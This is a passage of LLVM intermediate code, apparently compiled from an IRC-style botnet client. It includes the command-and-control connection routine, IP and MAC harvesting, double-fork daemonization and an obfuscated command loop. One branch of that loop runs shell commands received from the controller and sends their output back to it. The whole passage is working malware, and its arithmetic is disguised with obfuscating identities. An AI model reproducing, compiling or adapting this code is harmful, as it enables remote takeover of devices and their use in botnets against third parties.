  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = sub i32 0, %11
  %13 = sub i32 0, 1
  %14 = add i32 %12, %13
  %15 = sub i32 0, %14
  %16 = add nsw i32 %11, 1
  %17 = sext i32 %15 to i64
  %18 = icmp eq i64 %17, 1
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %26

; <label>:20:                                     ; preds = %10
  %21 = load i32, i32* @currentServer, align 4
  %22 = add i32 %21, -56666392
  %23 = add i32 %22, 1
  %24 = sub i32 %23, -56666392
  %25 = add nsw i32 %21, 1
  store i32 %24, i32* @currentServer, align 4
  br label %26

; <label>:26:                                     ; preds = %20, %19
  %27 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %28 = load i32, i32* @currentServer, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i8* @decode(i8* %31)
  %33 = call i8* @strcpy(i8* %27, i8* %32) #4
  store i32 6667, i32* %3, align 4
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #10
  %36 = icmp ne i8* %35, null
  br i1 %36, label %37, label %44

; <label>:37:                                     ; preds = %26
  %38 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %39 = call i8* @strchr(i8* %38, i32 58) #10
  %40 = getelementptr inbounds i8, i8* %39, i64 1
  %41 = call i32 @atoi(i8* %40) #10
  store i32 %41, i32* %3, align 4
  %42 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %43 = call i8* @strchr(i8* %42, i32 58) #10
  store i8 0, i8* %43, align 1
  br label %44

; <label>:44:                                     ; preds = %37, %26
  %45 = call i32 @socket(i32 2, i32 1, i32 0) #4
  store i32 %45, i32* @mainCommSock, align 4
  %46 = load i32, i32* @mainCommSock, align 4
  %47 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %48 = load i32, i32* %3, align 4
  %49 = call i32 @connectTimeout(i32 %46, i8* %47, i32 %48, i32 30)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %52, label %51

; <label>:51:                                     ; preds = %44
  store i32 1, i32* %1, align 4
  br label %53

; <label>:52:                                     ; preds = %44
  store i32 0, i32* %1, align 4
  br label %53

; <label>:53:                                     ; preds = %52, %51
  %54 = load i32, i32* %1, align 4
  ret i32 %54
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #4
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %103

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.72, i32 0, i32 0)) #4
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %103

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #4
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %103

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.73, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.74, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %100

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.6* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #4
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #4
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %99

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.7* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = sub i32 0, 1
  %97 = sub i32 %95, %96
  %98 = add nsw i32 %95, 1
  store i32 %97, i32* %10, align 4
  br label %79

; <label>:99:                                     ; preds = %79
  br label %100

; <label>:100:                                    ; preds = %99, %65
  %101 = load i32, i32* %2, align 4
  %102 = call i32 @close(i32 %101)
  br label %103

; <label>:103:                                    ; preds = %100, %36, %29, %15
  %104 = load i32, i32* %1, align 4
  ret i32 %104
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #3

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.75, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [4096 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca [1024 x i8], align 16
  %19 = alloca i32, align 4
  %20 = alloca [10 x i8*], align 16
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = call i32 @getpid() #4
  %26 = xor i32 %24, -1
  %27 = and i32 -1761239287, %26
  %28 = xor i32 -1761239287, -1
  %29 = and i32 %24, %28
  %30 = xor i32 %25, -1
  %31 = and i32 %30, -1761239287
  %32 = and i32 %25, %28
  %33 = or i32 %27, %29
  %34 = or i32 %31, %32
  %35 = xor i32 %33, %34
  %36 = xor i32 %24, %25
  call void @srand(i32 %35) #4
  %37 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %38 = call i32 @getpid() #4
  %39 = xor i32 %37, -1
  %40 = and i32 -505481753, %39
  %41 = xor i32 -505481753, -1
  %42 = and i32 %37, %41
  %43 = xor i32 %38, -1
  %44 = and i32 %43, -505481753
  %45 = and i32 %38, %41
  %46 = or i32 %40, %42
  %47 = or i32 %44, %45
  %48 = xor i32 %46, %47
  %49 = xor i32 %37, %38
  call void @init_rand(i32 %48)
  %50 = call i32 @getOurIP()
  %51 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), align 1
  %52 = zext i8 %51 to i32
  %53 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 1), align 1
  %54 = zext i8 %53 to i32
  %55 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 2), align 1
  %56 = zext i8 %55 to i32
  %57 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 3), align 1
  %58 = zext i8 %57 to i32
  %59 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 4), align 1
  %60 = zext i8 %59 to i32
  %61 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 5), align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.76, i32 0, i32 0), i32 %52, i32 %54, i32 %56, i32 %58, i32 %60, i32 %62)
  %64 = call i32 @fork() #4
  store i32 %64, i32* %6, align 4
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %66, label %69

; <label>:66:                                     ; preds = %2
  %67 = load i32, i32* %6, align 4
  %68 = call i32 @waitpid(i32 %67, i32* %8, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:69:                                     ; preds = %2
  %70 = load i32, i32* %6, align 4
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %84, label %72

; <label>:72:                                     ; preds = %69
  %73 = call i32 @fork() #4
  store i32 %73, i32* %7, align 4
  %74 = icmp ne i32 %73, 0
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %72
  call void @exit(i32 0) #14
  unreachable

; <label>:76:                                     ; preds = %72
  %77 = load i32, i32* %7, align 4
  %78 = icmp ne i32 %77, 0
  br i1 %78, label %80, label %79

; <label>:79:                                     ; preds = %76
  br label %82

; <label>:80:                                     ; preds = %76
  %81 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i32 0, i32 0))
  br label %82

; <label>:82:                                     ; preds = %80, %79
  br label %83

; <label>:83:                                     ; preds = %82
  br label %86

; <label>:84:                                     ; preds = %69
  %85 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i32 0, i32 0))
  br label %86

; <label>:86:                                     ; preds = %84, %83
  br label %87

; <label>:87:                                     ; preds = %86
  %88 = call i32 @setsid() #4
  %89 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.78, i32 0, i32 0)) #4
  %90 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #4
  br label %91

; <label>:91:                                     ; preds = %434, %94, %87
  %92 = call i32 @initConnection()
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %94, label %97

; <label>:94:                                     ; preds = %91
  %95 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.79, i32 0, i32 0))
  %96 = call i32 @sleep(i32 5)
  br label %91

; <label>:97:                                     ; preds = %91
  %98 = load i32, i32* @mainCommSock, align 4
  %99 = call i8* @getBuild()
  %100 = call i32 (i32, i8*, ...) @sockprintf(i32 %98, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i32 0, i32 0), i8* %99)
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  br label %101

; <label>:101:                                    ; preds = %433, %339, %252, %214, %97
  %102 = load i32, i32* @mainCommSock, align 4
  %103 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %104 = call i32 @recvLine(i32 %102, i8* %103, i32 4096)
  store i32 %104, i32* %10, align 4
  %105 = icmp ne i32 %104, -1
  br i1 %105, label %106, label %434

; <label>:106:                                    ; preds = %101
  store i32 0, i32* %11, align 4
  br label %107

; <label>:107:                                    ; preds = %198, %106
  %108 = load i32, i32* %11, align 4
  %109 = sext i32 %108 to i64
  %110 = load i64, i64* @numpids, align 8
  %111 = icmp ult i64 %109, %110
  br i1 %111, label %112, label %205

; <label>:112:                                    ; preds = %107
  %113 = load i32*, i32** @pids, align 8
  %114 = load i32, i32* %11, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i32, i32* %113, i64 %115
  %117 = load i32, i32* %116, align 4
  %118 = call i32 @waitpid(i32 %117, i32* null, i32 1)
  %119 = icmp sgt i32 %118, 0
  br i1 %119, label %120, label %197

; <label>:120:                                    ; preds = %112
  %121 = load i32, i32* %11, align 4
  %122 = sub i32 %121, 997386928
  %123 = add i32 %122, 1
  %124 = add i32 %123, 997386928
  %125 = add nsw i32 %121, 1
  store i32 %124, i32* %13, align 4
  br label %126

; <label>:126:                                    ; preds = %145, %120
  %127 = load i32, i32* %13, align 4
  %128 = zext i32 %127 to i64
  %129 = load i64, i64* @numpids, align 8
  %130 = icmp ult i64 %128, %129
  br i1 %130, label %131, label %150

; <label>:131:                                    ; preds = %126
  %132 = load i32*, i32** @pids, align 8
  %133 = load i32, i32* %13, align 4
  %134 = zext i32 %133 to i64
  %135 = getelementptr inbounds i32, i32* %132, i64 %134
  %136 = load i32, i32* %135, align 4
  %137 = load i32*, i32** @pids, align 8
  %138 = load i32, i32* %13, align 4
  %139 = sub i32 %138, -1106879366
  %140 = sub i32 %139, 1
  %141 = add i32 %140, -1106879366
  %142 = sub i32 %138, 1
  %143 = zext i32 %141 to i64
  %144 = getelementptr inbounds i32, i32* %137, i64 %143
  store i32 %136, i32* %144, align 4
  br label %145

; <label>:145:                                    ; preds = %131
  %146 = load i32, i32* %13, align 4
  %147 = sub i32 0, 1
  %148 = sub i32 %146, %147
  %149 = add i32 %146, 1
  store i32 %148, i32* %13, align 4
  br label %126

; <label>:150:                                    ; preds = %126
  %151 = load i32*, i32** @pids, align 8
  %152 = load i32, i32* %13, align 4
  %153 = sub i32 %152, 1274723451
  %154 = sub i32 %153, 1
  %155 = add i32 %154, 1274723451
  %156 = sub i32 %152, 1
  %157 = zext i32 %155 to i64
  %158 = getelementptr inbounds i32, i32* %151, i64 %157
  store i32 0, i32* %158, align 4
  %159 = load i64, i64* @numpids, align 8
  %160 = sub i64 %159, 5250272855817904436
  %161 = add i64 %160, -1
  %162 = add i64 %161, 5250272855817904436
  %163 = add i64 %159, -1
  store i64 %162, i64* @numpids, align 8
  %164 = load i64, i64* @numpids, align 8
  %165 = add i64 %164, 1854151162014712682
  %166 = add i64 %165, 1
  %167 = sub i64 %166, 1854151162014712682
  %168 = add i64 %164, 1
  %169 = mul i64 %167, 4
  %170 = call noalias i8* @malloc(i64 %169) #4
  %171 = bitcast i8* %170 to i32*
  store i32* %171, i32** %12, align 8
  store i32 0, i32* %13, align 4
  br label %172

; <label>:172:                                    ; preds = %187, %150
  %173 = load i32, i32* %13, align 4
  %174 = zext i32 %173 to i64
  %175 = load i64, i64* @numpids, align 8
  %176 = icmp ult i64 %174, %175
  br i1 %176, label %177, label %193

; <label>:177:                                    ; preds = %172
  %178 = load i32*, i32** @pids, align 8
  %179 = load i32, i32* %13, align 4
  %180 = zext i32 %179 to i64
  %181 = getelementptr inbounds i32, i32* %178, i64 %180
  %182 = load i32, i32* %181, align 4
  %183 = load i32*, i32** %12, align 8
  %184 = load i32, i32* %13, align 4
  %185 = zext i32 %184 to i64
  %186 = getelementptr inbounds i32, i32* %183, i64 %185
  store i32 %182, i32* %186, align 4
  br label %187

; <label>:187:                                    ; preds = %177
  %188 = load i32, i32* %13, align 4
  %189 = sub i32 %188, 738287921
  %190 = add i32 %189, 1
  %191 = add i32 %190, 738287921
  %192 = add i32 %188, 1
  store i32 %191, i32* %13, align 4
  br label %172

; <label>:193:                                    ; preds = %172
  %194 = load i32*, i32** @pids, align 8
  %195 = bitcast i32* %194 to i8*
  call void @free(i8* %195) #4
  %196 = load i32*, i32** %12, align 8
  store i32* %196, i32** @pids, align 8
  br label %197

; <label>:197:                                    ; preds = %193, %112
  br label %198

; <label>:198:                                    ; preds = %197
  %199 = load i32, i32* %11, align 4
  %200 = sub i32 0, %199
  %201 = sub i32 0, 1
  %202 = add i32 %200, %201
  %203 = sub i32 0, %202
  %204 = add nsw i32 %199, 1
  store i32 %203, i32* %11, align 4
  br label %107

; <label>:205:                                    ; preds = %107
  %206 = load i32, i32* %10, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %207
  store i8 0, i8* %208, align 1
  %209 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  call void @trim(i8* %209)
  %210 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %211 = call i8* @strstr(i8* %210, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0)) #10
  %212 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %213 = icmp eq i8* %211, %212
  br i1 %213, label %214, label %217

; <label>:214:                                    ; preds = %205
  %215 = load i32, i32* @mainCommSock, align 4
  %216 = call i32 (i32, i8*, ...) @sockprintf(i32 %215, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.81, i32 0, i32 0))
  br label %101

; <label>:217:                                    ; preds = %205
  %218 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %219 = call i8* @strstr(i8* %218, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.82, i32 0, i32 0)) #10
  %220 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %221 = icmp eq i8* %219, %220
  br i1 %221, label %222, label %223

; <label>:222:                                    ; preds = %217
  call void @exit(i32 0) #14
  unreachable

; <label>:223:                                    ; preds = %217
  %224 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  store i8* %224, i8** %14, align 8
  %225 = load i8*, i8** %14, align 8
  %226 = load i8, i8* %225, align 1
  %227 = zext i8 %226 to i32
  %228 = icmp eq i32 %227, 33
  br i1 %228, label %229, label %433

; <label>:229:                                    ; preds = %223
  %230 = load i8*, i8** %14, align 8
  %231 = getelementptr inbounds i8, i8* %230, i64 1
  store i8* %231, i8** %15, align 8
  br label %232

; <label>:232:                                    ; preds = %244, %229
  %233 = load i8*, i8** %15, align 8
  %234 = load i8, i8* %233, align 1
  %235 = zext i8 %234 to i32
  %236 = icmp ne i32 %235, 32
  br i1 %236, label %237, label %242

; <label>:237:                                    ; preds = %232
  %238 = load i8*, i8** %15, align 8
  %239 = load i8, i8* %238, align 1
  %240 = zext i8 %239 to i32
  %241 = icmp ne i32 %240, 0
  br label %242

; <label>:242:                                    ; preds = %237, %232
  %243 = phi i1 [ false, %232 ], [ %241, %237 ]
  br i1 %243, label %244, label %247

; <label>:244:                                    ; preds = %242
  %245 = load i8*, i8** %15, align 8
  %246 = getelementptr inbounds i8, i8* %245, i32 1
  store i8* %246, i8** %15, align 8
  br label %232

; <label>:247:                                    ; preds = %242
  %248 = load i8*, i8** %15, align 8
  %249 = load i8, i8* %248, align 1
  %250 = zext i8 %249 to i32
  %251 = icmp eq i32 %250, 0
  br i1 %251, label %252, label %253

; <label>:252:                                    ; preds = %247
  br label %101

; <label>:253:                                    ; preds = %247
  %254 = load i8*, i8** %15, align 8
  store i8 0, i8* %254, align 1
  %255 = load i8*, i8** %14, align 8
  %256 = getelementptr inbounds i8, i8* %255, i64 1
  store i8* %256, i8** %15, align 8
  %257 = load i8*, i8** %14, align 8
  %258 = load i8*, i8** %15, align 8
  %259 = call i64 @strlen(i8* %258) #10
  %260 = getelementptr inbounds i8, i8* %257, i64 %259
  %261 = getelementptr inbounds i8, i8* %260, i64 2
  store i8* %261, i8** %14, align 8
  br label %262

; <label>:262:                                    ; preds = %288, %253
  %263 = load i8*, i8** %14, align 8
  %264 = load i8*, i8** %14, align 8
  %265 = call i64 @strlen(i8* %264) #10
  %266 = add i64 %265, 4734063394856307125
  %267 = sub i64 %266, 1
  %268 = sub i64 %267, 4734063394856307125
  %269 = sub i64 %265, 1
  %270 = getelementptr inbounds i8, i8* %263, i64 %268
  %271 = load i8, i8* %270, align 1
  %272 = zext i8 %271 to i32
  %273 = icmp eq i32 %272, 10
  br i1 %273, label %286, label %274

; <label>:274:                                    ; preds = %262
  %275 = load i8*, i8** %14, align 8
  %276 = load i8*, i8** %14, align 8
  %277 = call i64 @strlen(i8* %276) #10
  %278 = add i64 %277, -7469346088975672228
  %279 = sub i64 %278, 1
  %280 = sub i64 %279, -7469346088975672228
  %281 = sub i64 %277, 1
  %282 = getelementptr inbounds i8, i8* %275, i64 %280
  %283 = load i8, i8* %282, align 1
  %284 = zext i8 %283 to i32
  %285 = icmp eq i32 %284, 13
  br label %286

; <label>:286:                                    ; preds = %274, %262
  %287 = phi i1 [ true, %262 ], [ %285, %274 ]
  br i1 %287, label %288, label %297

; <label>:288:                                    ; preds = %286
  %289 = load i8*, i8** %14, align 8
  %290 = load i8*, i8** %14, align 8
  %291 = call i64 @strlen(i8* %290) #10
  %292 = sub i64 %291, -7152711720349901352
  %293 = sub i64 %292, 1
  %294 = add i64 %293, -7152711720349901352
  %295 = sub i64 %291, 1
  %296 = getelementptr inbounds i8, i8* %289, i64 %294
  store i8 0, i8* %296, align 1
  br label %262

; <label>:297:                                    ; preds = %286
  %298 = load i8*, i8** %14, align 8
  store i8* %298, i8** %16, align 8
  br label %299

; <label>:299:                                    ; preds = %311, %297
  %300 = load i8*, i8** %14, align 8
  %301 = load i8, i8* %300, align 1
  %302 = zext i8 %301 to i32
  %303 = icmp ne i32 %302, 32
  br i1 %303, label %304, label %309

; <label>:304:                                    ; preds = %299
  %305 = load i8*, i8** %14, align 8
  %306 = load i8, i8* %305, align 1
  %307 = zext i8 %306 to i32
  %308 = icmp ne i32 %307, 0
  br label %309

; <label>:309:                                    ; preds = %304, %299
  %310 = phi i1 [ false, %299 ], [ %308, %304 ]
  br i1 %310, label %311, label %314

; <label>:311:                                    ; preds = %309
  %312 = load i8*, i8** %14, align 8
  %313 = getelementptr inbounds i8, i8* %312, i32 1
  store i8* %313, i8** %14, align 8
  br label %299

; <label>:314:                                    ; preds = %309
  %315 = load i8*, i8** %14, align 8
  store i8 0, i8* %315, align 1
  %316 = load i8*, i8** %14, align 8
  %317 = getelementptr inbounds i8, i8* %316, i32 1
  store i8* %317, i8** %14, align 8
  %318 = load i8*, i8** %16, align 8
  store i8* %318, i8** %17, align 8
  br label %319

; <label>:319:                                    ; preds = %323, %314
  %320 = load i8*, i8** %17, align 8
  %321 = load i8, i8* %320, align 1
  %322 = icmp ne i8 %321, 0
  br i1 %322, label %323, label %332

; <label>:323:                                    ; preds = %319
  %324 = load i8*, i8** %17, align 8
  %325 = load i8, i8* %324, align 1
  %326 = zext i8 %325 to i32
  %327 = call i32 @toupper(i32 %326) #10
  %328 = trunc i32 %327 to i8
  %329 = load i8*, i8** %17, align 8
  store i8 %328, i8* %329, align 1
  %330 = load i8*, i8** %17, align 8
  %331 = getelementptr inbounds i8, i8* %330, i32 1
  store i8* %331, i8** %17, align 8
  br label %319

; <label>:332:                                    ; preds = %319
  %333 = load i8*, i8** %16, align 8
  %334 = call i32 @strcmp(i8* %333, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.83, i32 0, i32 0)) #10
  %335 = icmp eq i32 %334, 0
  br i1 %335, label %336, label %362

; <label>:336:                                    ; preds = %332
  %337 = call i32 @listFork()
  %338 = icmp ne i32 %337, 0
  br i1 %338, label %339, label %340

; <label>:339:                                    ; preds = %336
  br label %101

; <label>:340:                                    ; preds = %336
  %341 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %341, i8 0, i64 1024, i32 16, i1 false)
  %342 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  %343 = load i8*, i8** %14, align 8
  %344 = call i32 (i8*, i8*, ...) @szprintf(i8* %342, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.84, i32 0, i32 0), i8* %343)
  %345 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  %346 = call i32 @fdpopen(i8* %345, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0))
  store i32 %346, i32* %19, align 4
  br label %347

; <label>:347:                                    ; preds = %352, %340
  %348 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  %349 = load i32, i32* %19, align 4
  %350 = call i8* @fdgets(i8* %348, i32 1024, i32 %349)
  %351 = icmp ne i8* %350, null
  br i1 %351, label %352, label %359

; <label>:352:                                    ; preds = %347
  %353 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  call void @trim(i8* %353)
  %354 = load i32, i32* @mainCommSock, align 4
  %355 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  %356 = call i32 (i32, i8*, ...) @sockprintf(i32 %354, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.85, i32 0, i32 0), i8* %355)
  %357 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %357, i8 0, i64 1024, i32 16, i1 false)
  %358 = call i32 @sleep(i32 1)
  br label %347

; <label>:359:                                    ; preds = %347
  %360 = load i32, i32* %19, align 4
